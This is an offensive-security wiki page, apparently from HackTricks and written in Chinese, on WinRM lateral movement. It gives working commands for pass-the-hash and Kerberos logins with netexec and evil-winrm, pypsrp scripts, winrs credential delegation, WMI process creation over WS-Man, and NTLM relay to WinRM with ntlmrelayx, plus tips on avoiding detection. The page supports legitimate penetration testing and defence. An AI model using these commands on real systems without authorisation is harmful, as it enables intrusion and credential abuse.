# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM 是 Windows 环境中最方便的 **lateral movement** 传输方式之一，因为它能通过 **WS-Man/HTTP(S)** 提供远程 shell，而不需要 SMB service creation tricks。若目标开放了 **5985/5986** 且你的 principal 被允许使用 remoting，你通常可以很快从“valid creds”切换到“interactive shell”。

关于 **protocol/service enumeration**、listeners、启用 WinRM、`Invoke-Command` 和通用客户端用法，请查看：

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Why operators like WinRM

- 使用 **HTTP/HTTPS** 而不是 SMB/RPC，因此在 PsExec-style execution 被阻止的地方也常常可用。
- 在使用 **Kerberos** 时，不需要把可重复使用的凭据发送到目标。
- 可在 **Windows**、**Linux** 和 **Python** 工具链中干净地工作（`winrs`、`evil-winrm`、`pypsrp`、`netexec`）。
- 交互式 PowerShell remoting 路径会在目标上以已认证用户上下文启动 **`wsmprovhost.exe`**，这在操作上与基于 service 的 exec 不同。

## Access model and prerequisites

实际中，成功的 WinRM lateral movement 取决于 **三** 件事：

1. 目标有一个 **WinRM listener**（`5985`/`5986`）且防火墙规则允许访问。
2. 该账户可以对该 endpoint **authenticate**。
3. 该账户被允许打开一个 **remoting session**。

获取该访问权限的常见方式：

- 目标上的 **Local Administrator**。
- 在较新的系统中属于 **Remote Management Users**，或在仍然认可该组的系统/组件上属于 **WinRMRemoteWMIUsers__**。
- 通过本地安全描述符 / PowerShell remoting ACL 修改显式委派的 remoting 权限。

如果你已经控制了一台拥有 admin 权限的主机，也要记住，你可以使用这里描述的技术，**在不加入完整 admin 组的情况下委派 WinRM access**：

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Authentication gotchas that matter during lateral movement

- **Kerberos 需要 hostname/FQDN**。如果你按 IP 连接，client 通常会回退到 **NTLM/Negotiate**。
- 在 **workgroup** 或跨 trust 的边缘场景中，NTLM 通常需要 **HTTPS**，或者把目标加入 client 上的 **TrustedHosts**。
- 对于 workgroup 中通过 Negotiate 使用的 **local accounts**，UAC remote restrictions 可能会阻止访问，除非使用内置 Administrator 账户或设置 `LocalAccountTokenFilterPolicy=1`。
- PowerShell remoting 默认使用 **`HTTP/<host>` SPN**。在某些环境中，如果 `HTTP/<host>` 已经注册给其他 service account，WinRM Kerberos 可能会因 `0x80090322` 失败；请改用带端口的 SPN，或者切换到存在该 SPN 的 **`WSMAN/<host>`**。

如果你在 password spraying 中拿到了 valid credentials，先通过 WinRM 验证它们，通常是检查这些凭据是否能直接拿到 shell 的最快方式：

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Linux-to-Windows lateral movement

### NetExec / CrackMapExec for validation and one-shot execution
```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```
### Evil-WinRM 用于交互式 shells

`evil-winrm` 仍然是 Linux 上最方便的交互式选项，因为它支持 **passwords**、**NT hashes**、**Kerberos tickets**、**client certificates**、文件传输，以及内存中的 PowerShell/.NET 加载。
```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```
### Kerberos SPN 边缘情况：`HTTP` vs `WSMAN`

当默认的 **`HTTP/<host>`** SPN 导致 Kerberos 失败时，尝试改为请求/使用 **`WSMAN/<host>`** ticket。 这通常出现在加固过或奇怪的企业环境中，因为 `HTTP/<host>` 已经绑定到另一个 service account。
```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```
这在你通过 **RBCD / S4U** 滥用，且你明确伪造或请求的是 **WSMAN** service ticket 而不是通用的 `HTTP` ticket 时也很有用。

### 基于证书的认证

WinRM 也支持 **client certificate authentication**，但该 certificate 必须在目标上映射到一个 **local account**。从 offensive 角度看，这在以下情况很重要：

- 你已经窃取/导出了一个已映射到 WinRM 的有效 client certificate 和 private key；
- 你滥用了 **AD CS / Pass-the-Certificate**，为某个 principal 获取了 certificate，然后切换到另一种认证路径；
- 你正在操作的环境刻意避免基于密码的远程连接。
```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```
Client-certificate WinRM 比 password/hash/Kerberos auth 少见得多，但当它存在时，它可以提供一条**passwordless lateral movement**路径，并且在 password rotation 后依然可用。

### Python / automation with `pypsrp`

如果你需要 automation 而不是 operator shell，`pypsrp` 可以从 Python 提供 WinRM/PSRP，并支持 **NTLM**、**certificate auth**、**Kerberos** 和 **CredSSP**。
```python
from pypsrp.client import Client

client = Client(
"srv01.domain.local",
username="DOMAIN\\user",
password="Password123!",
ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```
如果你需要比高层的 `Client` wrapper 更精细的控制，较底层的 `WSMan` + `RunspacePool` APIs 对两个常见的 operator 问题很有用：

- 强制使用 **`WSMAN`** 作为 Kerberos service/SPN，而不是许多 PowerShell clients 默认期望的 `HTTP`；
- 连接到一个 **non-default PSRP endpoint**，例如 **JEA** / custom session configuration，而不是 `Microsoft.PowerShell`。
```python
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool

wsman = WSMan(
"srv01.domain.local",
auth="kerberos",
ssl=False,
negotiate_service="WSMAN",
)

with wsman, RunspacePool(wsman, configuration_name="MyJEAEndpoint") as pool, PowerShell(pool) as ps:
ps.add_script("whoami; Get-Command")
output = ps.invoke()
print(output)
```
### 自定义 PSRP endpoints 和 JEA 在 lateral movement 中很重要

成功的 WinRM authentication **并不** 总是意味着你会进入默认的、无限制的 `Microsoft.PowerShell` endpoint。成熟的环境可能会暴露具有各自 ACLs 和 run-as 行为的 **custom session configurations** 或 **JEA** endpoints。

如果你已经在 Windows host 上获得了 code execution，并且想了解存在哪些 remoting surfaces，可以枚举已注册的 endpoints：
```powershell
Get-PSSessionConfiguration | Select-Object Name, Permission
```
当存在有用的 endpoint 时，明确针对它，而不是默认的 shell：
```powershell
Enter-PSSession -ComputerName srv01.domain.local -ConfigurationName MyJEAEndpoint
```
实际攻击中的影响：

- 即使一个 **restricted** 端点只暴露了恰当的 cmdlets/functions，用于服务控制、文件访问、进程创建，或任意 .NET / 外部命令执行，它仍然足以用于 lateral movement。
- 配置错误的 **JEA** role 在暴露危险命令时尤其有价值，例如 `Start-Process`、宽泛的通配符、可写 provider，或允许你绕过预期限制的自定义 proxy functions。
- 由 **RunAs virtual accounts** 或 **gMSAs** 支持的 endpoints 会改变你运行的命令的实际 security context。尤其是，基于 gMSA 的 endpoint 即使在普通 WinRM session 会遇到经典 delegation problem 时，也能在 **second hop** 上提供 **network identity**。

## Windows-native WinRM lateral movement

### `winrs.exe`

`winrs.exe` 是内置的，当你想要 **native WinRM command execution** 而不打开交互式 PowerShell remoting session 时非常有用：
```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```
有两个容易忘记但在实践中很重要的 flags：

- 当远程 principal **不是** 本地管理员时，通常需要 `/noprofile`。
- `/allowdelegate` 允许远程 shell 使用你的 credentials 去访问**第三台主机**（例如，当命令需要 `\\fileserver\share` 时）。
```cmd
winrs -r:srv01.domain.local /noprofile cmd /c set
winrs -r:srv01.domain.local /allowdelegate cmd /c dir \\fileserver.domain.local\share
```
从操作上看，`winrs.exe` 通常会导致类似以下的远程进程链：
```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```
值得记住这一点，因为它不同于基于 service 的 exec，也不同于交互式 PSRP sessions。

### `winrm.cmd` / WS-Man COM instead of PowerShell remoting

你也可以通过 **WinRM transport** 在不使用 `Enter-PSSession` 的情况下执行命令，方法是通过 WS-Man 调用 WMI classes。这样 transport 仍然是 WinRM，而远程执行原语则变成 **WMI `Win32_Process.Create`**:
```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```
当以下情况成立时，这种方法很有用：

- PowerShell logging 被高度监控。
- 你想要 **WinRM transport**，但不想要传统的 PS remoting 工作流。
- 你正在围绕 **`WSMan.Automation`** COM object 构建或使用自定义工具。

## NTLM relay to WinRM (WS-Man)

当 SMB relay 被 signing 阻止，而 LDAP relay 受到限制时，**WS-Man/WinRM** 可能仍然是一个有吸引力的 relay 目标。现代 `ntlmrelayx.py` 包含 **WinRM relay servers**，并且可以 relay 到 **`wsman://`** 或 **`winrms://`** targets。
```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```
两个实用提示：

- 当目标接受 **NTLM** 且被 relay 的主体被允许使用 WinRM 时，Relay 最有用。
- 最近的 Impacket 代码会专门处理 **`WSMANIDENTIFY: unauthenticated`** 请求，因此类似 `Test-WSMan` 的探测不会破坏 relay 流程。

关于落地第一个 WinRM 会话后的 multi-hop 限制，请查看：

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## OPSEC 和检测注意事项

- **交互式 PowerShell remoting** 通常会在目标上创建 **`wsmprovhost.exe`**。
- **`winrs.exe`** 通常会创建 **`winrshost.exe`**，然后再启动请求的子进程。
- 自定义 **JEA** endpoints 可能会以 **`WinRM_VA_*`** 虚拟账户或已配置的 **gMSA** 执行动作，这会改变遥测和 second-hop 行为，相比普通用户上下文 shell 不同。
- 如果你使用 PSRP 而不是原始 `cmd.exe`，要预期 **network logon** 遥测、WinRM 服务事件，以及 PowerShell operational/script-block logging。
- 如果你只需要执行单个命令，`winrs.exe` 或一次性 WinRM 执行可能比长期存在的交互式 remoting session 更安静。
- 如果 Kerberos 可用，优先使用 **FQDN + Kerberos**，而不是 IP + NTLM，以减少信任问题以及客户端侧 `TrustedHosts` 的尴尬修改。

## References

- [Microsoft: JEA Security Considerations](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations?view=powershell-7.6)
- [pypsrp README](https://github.com/jborean93/pypsrp)
- [Microsoft: Error `0x80090322` when connecting PowerShell to a remote server via WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)


{{#include ../../banners/hacktricks-training.md}}
